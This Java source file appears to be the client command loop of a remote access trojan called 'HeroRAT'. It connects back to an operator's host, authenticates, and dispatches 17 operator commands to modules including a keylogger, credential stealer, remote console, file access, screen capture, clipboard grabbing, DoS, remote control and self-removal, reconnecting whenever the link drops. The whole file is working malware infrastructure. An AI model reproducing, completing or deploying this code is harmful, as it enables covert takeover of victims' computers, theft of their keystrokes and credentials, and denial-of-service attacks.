package net.herorat.network;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import net.herorat.features.blocker.Blocker;
import net.herorat.features.chat.Chat;
import net.herorat.features.clipboard.Clipboard;
import net.herorat.features.console.Console;
import net.herorat.features.dos.Dos;
import net.herorat.features.file.File;
import net.herorat.features.information.Information;
import net.herorat.features.keylogger.Keylogger;
import net.herorat.features.message.Message;
import net.herorat.features.ping.Ping;
import net.herorat.features.process.Process;
import net.herorat.features.remote.Remote;
import net.herorat.features.screen.Screen;
import net.herorat.features.shutdown.Shutdown;
import net.herorat.features.stealer.Stealer;
import net.herorat.features.suicide.Suicide;
import net.herorat.features.system.System;
import net.herorat.features.urlvisit.UrlVisit;
import net.herorat.utils.Crypto;


public class Network extends Thread
{
	private String ip;
	private int port;
	private String password;
	
	private boolean isConnected;
	private Socket socket;
	private InputStream input;
	private OutputStream output;
	private DataInputStream inputstream;
	private DataOutputStream outputstream;

	public Network(String ip, int port, String password)
	{
		this.ip = ip;
		this.port = port;
		this.password = password;
		
		this.isConnected = false;
	}
	
	public void run()
	{
		java.lang.System.out.println("");
		java.lang.System.out.println("Waiting for connection ...");
	
		do
		{
			try
			{
				this.socket = new Socket(this.ip, this.port);
				this.input = this.socket.getInputStream();
				this.output = this.socket.getOutputStream();
				this.inputstream = new DataInputStream(this.input);
				this.outputstream = new DataOutputStream(this.output);
				
				Information.send(outputstream, this.password);
				String response = new String(Crypto.decrypt( Crypto.hexToByte(inputstream.readUTF())));
				if (response.equalsIgnoreCase("ACCEPT_CONNECTION")) this.isConnected = true;
				else sleep();
			}
			catch (Exception e)
			{
				try
				{
					sleep();
				}
				catch (Exception ex) {}
			}
		}
		while (!this.isConnected);
		
		java.lang.System.out.println("Connection established");
		
		try
		{
			while (this.isConnected)
			{
				Packet packet;
				int packet_id = inputstream.readInt();
				switch (packet_id)
				{
					case 1:
						packet = new Packet1Ping(inputstream);
						Ping.handle(packet.read(), outputstream);						// OK
						break;
					case 2:
						packet = new Packet2Console(inputstream);
						Console.handle(packet.read(), outputstream);					// OK
						break;
					case 3:
						packet = new Packet3Dos(inputstream);
						Dos.handle(packet.read(), outputstream);						// OK
						break;
					case 4:
						packet = new Packet4Keylogger(inputstream);
						Keylogger.handle(packet.read(), outputstream);					// OK
						break;
					case 5:
						packet = new Packet5Chat(inputstream);
						Chat.handle(packet.read(), outputstream);						// OK
						break;
					case 6:
						packet = new Packet6File(inputstream);
						File.handle(packet.read(), outputstream);						// OK
						break;
					case 7:
						packet = new Packet7System(inputstream);
						System.handle(packet.read(), outputstream);						// OK
						break;
					case 8:
						packet = new Packet8Message(inputstream);
						Message.handle(packet.read(), outputstream);					// OK
						break;
					case 9:
						packet = new Packet9Process(inputstream);
						Process.handle(packet.read(), outputstream);					// OK
						break;
					case 10:
						packet = new Packet10Screen(inputstream);
						Screen.handle(packet.read(), outputstream);						// OK
						break;
					case 11:
						packet = new Packet11Stealer(inputstream);
						Stealer.handle(packet.read(), outputstream);					// OK
						break;
					case 12:
						packet = new Packet12Urlvisit(inputstream);
						UrlVisit.handle(packet.read(), outputstream);					// OK
						break;
					case 13:
						packet = new Packet13Shutdown(inputstream);
						Shutdown.handle(packet.read(), outputstream);					// OK
						break;
					case 14:
						packet = new Packet14Blocker(inputstream);
						Blocker.handle(packet.read(), outputstream); 					// OK
						break;
					case 15:
						packet = new Packet15Clipboard(inputstream);
						Clipboard.handle(packet.read(), outputstream); 					// OK
						break;
					case 16:
						packet = new Packet16Remote(inputstream);
						Remote.handle(packet.read(), outputstream);						// OK
						break;
					case 17:
						packet = new Packet17Suicide(inputstream);
						Suicide.handle(packet.read(), outputstream);					// OK
						break;
				}
			}
		}
		catch (Exception e)
		{
			java.lang.System.out.println("Connection closed");
			java.lang.System.out.println("Restarting ...");
			Network network = new Network(this.ip, this.port, this.password);
			network.start();
		}
	}
	
	public void sleep()
	{
		try
		{
			Thread.sleep(100);
		}
		catch (Exception e) {}
	}
}